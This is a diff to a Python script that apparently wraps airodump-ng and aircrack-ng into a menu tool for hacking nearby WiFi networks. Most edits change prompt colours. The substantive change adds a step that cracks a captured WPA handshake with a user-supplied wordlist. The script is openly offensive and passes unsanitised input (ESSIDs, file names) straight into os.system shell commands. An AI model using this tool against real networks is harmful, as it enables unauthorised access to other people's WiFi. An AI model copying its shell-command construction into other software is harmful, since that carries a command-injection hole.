@@ -89,7 +89,7 @@ def banner():
     print(colored("*[3] Clear                       *","yellow"))
     print(colored("*[4] Exit                        *","yellow"))
     print(colored("**********************************","yellow"))
-    response = input(colored("Lazy: ","blue"))
+    response = input(colored("Lazy: ","yellow"))
     if response == '1':
         check_interface()
     elif response == '2':
@@ -322,21 +322,21 @@ def clear():
         os.system("rm {}".format(cap[cap_i]))
         cap_i+=1
     if len(cap) == 0:
-        print("No cap File Found...","red")
+        print(colored("No cap File Found...","red"))
         time.sleep(2)
     #delete all csv files
     while csv_i < len(csv):
         os.system("rm {}".format(csv[csv_i]))
         csv_i+=1
     if len(csv) == 0:
-        print("No csv File Found...","red")
+        print(colored("No csv File Found...","red"))
         time.sleep(2)
     #delete all netxml files
     while netxml_i < len(netxml):
         os.system("rm {}".format(netxml[netxml_i]))
         netxml_i+=1
     if len(netxml) == 0:
-        print("No netxml File Found...","red")
+        print(colored("No netxml File Found...","red"))
         time.sleep(2)
 
     print(colored("Done!","green"))
@@ -365,7 +365,7 @@ def manual():
     print(colored("*[6] Go Back                     *","yellow"))
     print(colored("*[7] Exit                        *","yellow"))
     print(colored("**********************************","yellow"))
-    response = input(colored("Lazy: ","blue"))
+    response = input(colored("Lazy: ","yellow"))
     if response == '1':
         enb_mon()
     elif response == '2':
@@ -441,7 +441,7 @@ def search_net():
     time.sleep(2)
     os.system("xterm  -bg black -fg brown -e 'airodump-ng --write nearby {}'".format(inte))
     print(colored("Wifi List Will Be Available In Select Network To Hack Section....","green"))
-    input(colored("Press Enter To Continue...","green"))
+    input(colored("Press Enter To Continue...","yellow"))
     manual()
 
 #select a network to hack
@@ -485,15 +485,17 @@ def printa():
         print("")
         time.sleep(1)
         i+=1
-    response = input(colored("Lazy: ","blue"))
+    response = input(colored("Lazy: ","yellow"))
     topri = (int(response) - 1)
     os.system("clear")
     print(colored("You Selected Network {}","green").format(int(response)))
+    print("")
     print(colored("ESSID   : {}","green").format(str(essidm[topri].text)))
     print(colored("BSSID   : {}","green").format(str(bssidm[topri].text)))
     print(colored("CHANNEl : {}","green").format(str(channelm[topri].text)))
     print("")
-    input(colored("Press Enter To Start Hack","green"))
+    input(colored("Press Enter To Start Hack","yellow"))
+    print("")
     os.system("rm *.cap")
     os.system("rm *.csv")
     os.system("rm *.netxml")
@@ -514,6 +516,9 @@ def sta_aird():
     print(colored("Wait For Handshake Then Close Both The Window","yellow"))                                                                                                           
     time.sleep(2)                                                                                                                                                                
     os.system("xterm -bg black -fg brown -e 'airodump-ng --bssid {} --channel {} --write {} {}'".format(bssidm[topri].text,channelm[topri].text,essidm[topri].text,inte))
+    os.system("clear")
+    print(colored("Got Handshake...","green"))
+    input(colored("Press Enter To Continue...","yellow"))
     manual()
 
 def sta_airp():
@@ -557,6 +562,8 @@ def restore():
 #####PASSWORD CRACK####
 #######################
 def password():
+    os.system("rm *.csv")
+    os.system("rm *.netxml")
     os.system("clear")
     print(colored("**********************************","yellow"))
     print(colored("*   _                     __ _   *","yellow"))
@@ -572,9 +579,16 @@ def password():
     print(colored("*[3] Go Back                     *","yellow"))
     print(colored("*[4] Exit                        *","yellow"))
     print(colored("**********************************","yellow"))
-    response = input(colored("Lazy: ","blue"))
+    response = input(colored("Lazy: ","yellow"))
     if response == '1':
-        pass
+        print(colored("Give Me A Wordlist","yellow"))
+        wordl = input(colored("Lazy: ","yellow"))
+        print(colored("Name Of Capture File","yellow"))
+        name = input(colored("Lazy: ","yellow"))
+        print(colored("Now Cracking Password...","green"))
+        time.sleep(2)
+        os.system("xterm -hold -bg black -fg brown -e 'aircrack-ng -w {} {}-01.cap'".format(wordl,name))
+        banner()
     elif response == '2':
         pass
     elif response == '3':
